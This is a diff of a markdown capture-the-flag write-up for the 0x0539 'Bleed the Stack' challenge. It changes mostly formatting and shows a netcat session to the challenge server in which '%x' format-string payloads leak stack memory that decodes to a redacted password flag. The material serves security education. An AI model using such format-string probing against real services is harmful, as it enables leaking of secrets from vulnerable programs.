@@ -7,11 +7,11 @@ published: true
 tags: ["capture the flag", "0x0539", "binex"]
 ---
 
-# bleed the stack
+# Bleed the Stack
 
-([challenge page available @ 0x0539.net](https://0x0539.net/play/fangorn/bleedthestack))
+> [challenge page available @ 0x539.net](https://0x0539.net/play/fangorn/bleedthestack)
 
-```
+```bash
 pls@RUBY ~ > nc challenges.0x0539.net 7070
 ADVANCED CHALLENGE :: BLEED THE STACK
 *****************************
@@ -22,7 +22,9 @@ Test me! Enter your name and I'll print it back to you!
 This challenge is based around a command-line program served over `netcat`. Given the challenge's name, our flag is probably hidden in this program's call stack, so I start off by sending `%x`, or a hexadecimal format string specifier.
 This returned hex values, which means the program is likely vulnerable to a [format string attack](https://owasp.org/www-community/attacks/Format_string_attack):
 
-```
+```bash
+# ...
+
 Test me! Enter your name and I'll print it back to you!
 %x %x %x %x %x %x %x %x
 40 f7f77620 1 0 1 20656854 73736170 64726f77
@@ -78,13 +80,13 @@ main()
 
 The initial leaked output from this program's call stack gives us the following raw hex:
 
-```bytearray
+```lua
 40 f7f20620 1 0 1 20656854 73736170 64726f77 3a736920 6c5f4920 5f337630 6d723066 625f7434 733675 25207825 78252078 20782520 25207825 78252078 20782520 25207825
 ```
 
 Which our script will parse, decoding ASCII strings from their hexadecimal values:
 
-```bash
+```lua
 @ f7f20620 The password is: [flag redacted] %x %x %x %x %x %x %x %x %x %
 ```
 
